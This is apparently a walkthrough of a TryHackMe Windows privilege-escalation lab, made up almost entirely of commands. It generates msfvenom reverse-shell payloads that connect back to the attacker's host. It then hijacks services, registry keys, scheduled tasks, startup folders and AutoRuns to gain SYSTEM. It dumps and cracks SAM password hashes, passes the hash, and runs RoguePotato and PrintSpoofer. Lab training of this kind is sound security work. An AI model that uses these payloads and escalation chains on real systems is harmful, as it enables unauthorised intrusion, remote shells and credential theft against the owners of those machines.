# Windows PrivEsc



**Room Link:** [https://tryhackme.com/r/room/windows10privesc](https://tryhackme.com/r/room/windows10privesc)

## Generate a Reverse Shell Executable

On Kali, generate a reverse shell executable (reverse.exe) using msfvenom. Update the LHOST IP address accordingly:

**Kali**

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=54 -f exe -o reverse.exe
```

Transfer the reverse.exe file to the C:\PrivEsc directory on Windows. There are many ways you could do this, however the simplest is to start an SMB server on Kali in the same directory as the file, and then use the standard Windows copy command to transfer the file.

On Kali, in the same directory as reverse.exe:

**Kali**

```
ss -lptn 'sport = :139'
kill -9 $PID
sudo python3.9 /opt/impacket/build/scripts-3.9/smbserver.py kali . 
```

On Windows (update the IP address with your Kali IP):

**Victim**

```
xfreerdp +clipboard /u:user /p:password321 /cert:ignore /v:$VICTIM /size:1024x568 
```

**Victim**

```
copy \\$KALI\kali\reverse.exe C:\PrivEsc\reverse.exe
```

Test the reverse shell by setting up a netcat listener on Kali:

**Kali**

```
rlwrap nc -nvlp 54 
```

Then run the reverse.exe executable on Windows and catch the shell:

**Victim**

```
C:\PrivEsc\reverse.exe 
```

The reverse.exe executable will be used in many of the tasks in this room, so don't delete it!

<figure><img src="../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Service Exploits - Insecure Service Permissions

Use accesschk.exe to check the "user" account's permissions on the "daclsvc" service:

**Victim**

```
C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Note that the "user" account has the permission to change the service config (S**ERVICE\_CHANGE\_CONFIG**).

Query the service and note that it runs with SYSTEM privileges (SERVICE\_START\_NAME):

**Victim**

```
sc qc daclsvc
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Modify the service config and set the BINARY\_PATH\_NAME (binpath) to the reverse.exe executable you created:

**Victim**

```
sc config daclsvc binpath="\"C:\PrivEsc\reverse.exe\""

sc qc daclsvc
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

**Kali**

```
rlwrap nc -nvlp 54 
```

**Victim**

```
net start daclsvc
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Service Exploits - Unquoted Service Path

Query the "unquotedsvc" service and note that it runs with SYSTEM privileges (SERVICE\_START\_NAME) and that the BINARY\_PATH\_NAME is unquoted and contains spaces.

**VICTIM**

```
sc qc unquotedsvc
```

<figure><img src="../../.gitbook/assets/image (1209).png" alt=""><figcaption></figcaption></figure>

Using accesschk.exe, note that the BUILTIN\Users group is allowed to write to the C:\Program Files\Unquoted Path Service\ directory:

**Victim**

```
C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
```

<figure><img src="../../.gitbook/assets/image (1211).png" alt=""><figcaption></figcaption></figure>

Copy the reverse.exe executable you created to this directory and rename it Common.exe:

**Victim**

```
copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

**Kali**

```
rlwrap nc -nvlp 54 
```

**Victim**

```
net start unquotedsvc
```

<figure><img src="../../.gitbook/assets/image (1212).png" alt=""><figcaption></figcaption></figure>

## Service Exploits - Weak Registry Permissions

Query the "regsvc" service and note that it runs with SYSTEM privileges (SERVICE\_START\_NAME).

**Victim**

```
sc qc regsvc
```

<figure><img src="../../.gitbook/assets/image (1213).png" alt=""><figcaption></figcaption></figure>

Using accesschk.exe, note that the registry entry for the regsvc service is writable by the "NT AUTHORITY\INTERACTIVE" group (essentially all logged-on users):

**Victim**

```
C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
```

<figure><img src="../../.gitbook/assets/image (1214).png" alt=""><figcaption></figcaption></figure>

Overwrite the ImagePath registry key to point to the reverse.exe executable you created:

**Victim**

```
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
```

<figure><img src="../../.gitbook/assets/image (1215).png" alt=""><figcaption></figcaption></figure>

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

**Kali**

```
rlwrap nc -nvlp 54 
```

**Victim**

```
net start regsvc
```

<figure><img src="../../.gitbook/assets/image (1216).png" alt=""><figcaption></figcaption></figure>

## Service Exploits - Insecure Service Executables

Query the "filepermsvc" service and note that it runs with SYSTEM privileges (SERVICE\_START\_NAME).

**Victim**

```
sc qc filepermsvc
```

<figure><img src="../../.gitbook/assets/image (1217).png" alt=""><figcaption></figcaption></figure>

Using accesschk.exe, note that the service binary (BINARY\_PATH\_NAME) file is writable by everyone:

**Victim**

```
C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
```

<figure><img src="../../.gitbook/assets/image (1219).png" alt=""><figcaption></figcaption></figure>

Copy the reverse.exe executable you created and replace the filepermservice.exe with it:

**Victim**

```
copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
```

<figure><img src="../../.gitbook/assets/image (1218).png" alt=""><figcaption></figcaption></figure>

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

**Kali**

```
rlwrap nc -nvlp 54 
```

**Victim**

```
net start filepermsvc
```

<figure><img src="../../.gitbook/assets/image (1220).png" alt=""><figcaption></figcaption></figure>

## Registry - AutoRuns

Query the registry for AutoRun executables:

**Victim**

```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

<figure><img src="../../.gitbook/assets/image (1221).png" alt=""><figcaption></figcaption></figure>

Using accesschk.exe, note that one of the AutoRun executables is writable by everyone:

**Victim**

```
C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
```

<figure><img src="../../.gitbook/assets/image (1222).png" alt=""><figcaption></figcaption></figure>

Copy the reverse.exe executable you created and overwrite the AutoRun executable with it:

**Victim**

```
copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
```

Start a listener on Kali and then restart the Windows VM. Open up a new RDP session to trigger a reverse shell running with admin privileges. You should not have to authenticate to trigger it, however if the payload does not fire, log in as an admin (admin/password123) to trigger it. Note that in a real world engagement, you would have to wait for an administrator to log in themselves!

**Kali**

```
rlwrap nc -nvlp 54 
```

**Kali**

```
xfreerdp /u:admin /p:password123 /cert:ignore /v:$VICTIM
```

<figure><img src="../../.gitbook/assets/image (1223).png" alt=""><figcaption></figcaption></figure>

## Registry - AlwaysInstallElevated

Query the registry for AlwaysInstallElevated keys:

**Victim**

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

<figure><img src="../../.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

Note that both keys are set to 1 (0x1).

On Kali, generate a reverse shell Windows Installer (reverse.msi) using msfvenom. Update the LHOST IP address accordingly:\
**Kali**

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=54 -f msi -o reverse.msi
```

Transfer the reverse.msi file to the C:\PrivEsc directory on Windows (use the SMB server method from earlier).

**Kali**

```
sudo python3.9 /opt/impacket/build/scripts-3.9/smbserver.py kali . 
```

**Victim**

```
copy \\$KALI\kali\reverse.msi C:\PrivEsc\reverse.msi
```

Start a listener on Kali and then run the installer to trigger a reverse shell running with SYSTEM privileges:\


**Kali**

```
rlwrap nc -nvlp 54
```

**Victim**

```
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```

<figure><img src="../../.gitbook/assets/image (1225).png" alt=""><figcaption></figcaption></figure>

## Passwords - Registry

(For some reason sometimes the password does not get stored in the registry. If this is the case, use the following as the answer: password123)\


The registry can be searched for keys and values that contain the word "password":

**Victim**

```
reg query HKLM /f password /t REG_SZ /s
```

If you want to save some time, query this specific key to find admin AutoLogon credentials:

**Victim**

```
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
```

On Kali, use the winexe command to spawn a command prompt running with the admin privileges (update the password with the one you found):

**Kali**

```
winexe -U 'admin%password' //$VICTIM cmd.exe
```

## Passwords - Saved Creds

List any saved credentials:

**Victim**

```
cmdkey /list
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

Note that credentials for the "admin" user are saved. If they aren't, run the C:\PrivEsc\savecred.bat script to refresh the saved credentials.

Start a listener on Kali and run the reverse.exe executable using runas with the admin user's saved credentials:

**Kali**

```
rlwrap nc -nvlp 54
```

**Victim**

```
runas /savecred /user:admin C:\PrivEsc\reverse.exe
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Passwords - Security Account Manager (SAM)

The SAM and SYSTEM files can be used to extract user password hashes. This VM has insecurely stored backups of the SAM and SYSTEM files in the C:\Windows\Repair\ directory.

Transfer the SAM and SYSTEM files to your Kali VM:

**Kali**

```
sudo python3.9 /opt/impacket/build/scripts-3.9/smbserver.py kali . 
```

**Victim**

```
copy C:\Windows\Repair\SAM \\$KALI\kali\
copy C:\Windows\Repair\SYSTEM \\$KALI\kali\
```

On Kali, clone the creddump7 repository (the one on Kali is outdated and will not dump hashes correctly for Windows 10!) and use it to dump out the hashes from the SAM and SYSTEM files:

**Kali**

```
git clone https://github.com/Tib3rius/creddump7
pip3 install pycrypto
python3 creddump7/pwdump.py SYSTEM SAM
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Crack the admin NTLM hash using hashcat:

**Kali**

```
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt  --force
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt  --show
```

You can use the cracked password to log in as the admin using winexe or RDP.

<figure><img src="../../.gitbook/assets/image (1226).png" alt=""><figcaption></figcaption></figure>

## Passwords - Passing the Hash

Why crack a password hash when you can authenticate using the hash?

Use the full admin hash with pth-winexe to spawn a shell running as admin without needing to crack their password. Remember the full hash includes both the LM and NTLM hash, separated by a colon:

```
pip3 install impacket --force-reinstall --ignore-installed
psexec.py -hashes a9fdfa038c4b75ebc76dc855dd74f0da:a9fdfa038c4b75ebc76dc855dd74f0da admin@$VICTIM
```

<figure><img src="../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

## Scheduled Tasks

View the contents of the C:\DevTools\CleanUp.ps1 script:

**Victim**

```
type C:\DevTools\CleanUp.ps1
```

<figure><img src="../../.gitbook/assets/image (1228).png" alt=""><figcaption></figcaption></figure>

The script seems to be running as SYSTEM every minute. Using accesschk.exe, note that you have the ability to write to this file:

**Victim**

```
C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
```

<figure><img src="../../.gitbook/assets/image (1229).png" alt=""><figcaption></figcaption></figure>

Start a listener on Kali and then append a line to the C:\DevTools\CleanUp.ps1 which runs the reverse.exe executable you created:

**Kali**

```
rlwrap nc -nvlp 54 
```

**Victim**

```
echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
```

Wait for the Scheduled Task to run, which should trigger the reverse shell as SYSTEM.

<figure><img src="../../.gitbook/assets/image (1230).png" alt=""><figcaption></figcaption></figure>

## Insecure GUI Apps

Start an RDP session as the "user" account:

**Victim**

```
xfreerdp +clipboard /u:user /p:password321 /cert:ignore /v:$VICTIM /size:1024x568 
```

Double-click the "AdminPaint" shortcut on your Desktop. Once it is running, open a command prompt and note that Paint is running with admin privileges:

<figure><img src="../../.gitbook/assets/image (1231).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
tasklist /V | findstr mspaint.exe
```

<figure><img src="../../.gitbook/assets/image (1232).png" alt=""><figcaption></figcaption></figure>

In Paint, click "File" and then "Open". In the open file dialog box, click in the navigation input and paste: file://c:/windows/system32/cmd.exe

<figure><img src="../../.gitbook/assets/image (1233).png" alt=""><figcaption></figcaption></figure>

Press Enter to spawn a command prompt running with admin privileges.

<figure><img src="../../.gitbook/assets/image (1234).png" alt=""><figcaption></figcaption></figure>

## Startup Apps

Using accesschk.exe, note that the BUILTIN\Users group can write files to the StartUp directory:

**Victim**

```
C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

<figure><img src="../../.gitbook/assets/image (1236).png" alt=""><figcaption></figcaption></figure>

Using cscript, run the C:\PrivEsc\CreateShortcut.vbs script which should create a new shortcut to your reverse.exe executable in the StartUp directory:

**Victim**

```
cscript C:\PrivEsc\CreateShortcut.vbs
```

<figure><img src="../../.gitbook/assets/image (1237).png" alt=""><figcaption></figcaption></figure>

Start a listener on Kali, and then simulate an admin logon using RDP and the credentials you previously extracted:

**Kali**

```
rlwrap nc -nvlp 54 
```

**Victim**

```
xfreerdp +clipboard /u:admin /p:password321 /cert:ignore /v:$VICTIM /size:1024x568 
```

A shell running as admin should connect back to your listener.

<figure><img src="../../.gitbook/assets/image (1238).png" alt=""><figcaption></figcaption></figure>

## Token Impersonation - Rogue Potato

Set up a socat redirector on Kali, forwarding Kali port 135 to port 9999 on Windows:

**Kali**

```
sudo socat tcp-listen:135,reuseaddr,fork tcp:$VICTIM:9999
```

Start a listener on Kali. Simulate getting a service account shell by logging into RDP as the admin user, starting an elevated command prompt (right-click -> run as administrator) and using PSExec64.exe to trigger the reverse.exe executable you created with the permissions of the "local service" account:

<figure><img src="../../.gitbook/assets/image (1240).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
```

Start another listener on Kali.

**Kali**

```
rlwrap nc -nvlp 54 
```

Now, in the "local service" reverse shell you triggered, run the RoguePotato exploit to trigger a second reverse shell running with SYSTEM privileges (update the IP address with your Kali IP accordingly):

**Victim**

```
C:\PrivEsc\RoguePotato.exe -r $KALI -e "C:\PrivEsc\reverse.exe" -l 9999
```

<figure><img src="../../.gitbook/assets/image (1241).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1244).png" alt=""><figcaption></figcaption></figure>

## Token Impersonation - PrintSpoofer

Start a listener on Kali. Simulate getting a service account shell by logging into RDP as the admin user, starting an elevated command prompt (right-click -> run as administrator) and using PSExec64.exe to trigger the reverse.exe executable you created with the permissions of the "local service" account:\


**Kali**

```
rlwrap nc -nvlp 54 
```

**Victim**

```
C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
```

<figure><img src="../../.gitbook/assets/image (1243).png" alt=""><figcaption></figcaption></figure>

Start another listener on Kali.

**Kali**

```
rlwrap nc -nvlp 54 
```

Now, in the "local service" reverse shell you triggered, run the PrintSpoofer exploit to trigger a second reverse shell running with SYSTEM privileges (update the IP address with your Kali IP accordingly):

**Victim**

```
C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i
```

<figure><img src="../../.gitbook/assets/image (1242).png" alt=""><figcaption></figcaption></figure>
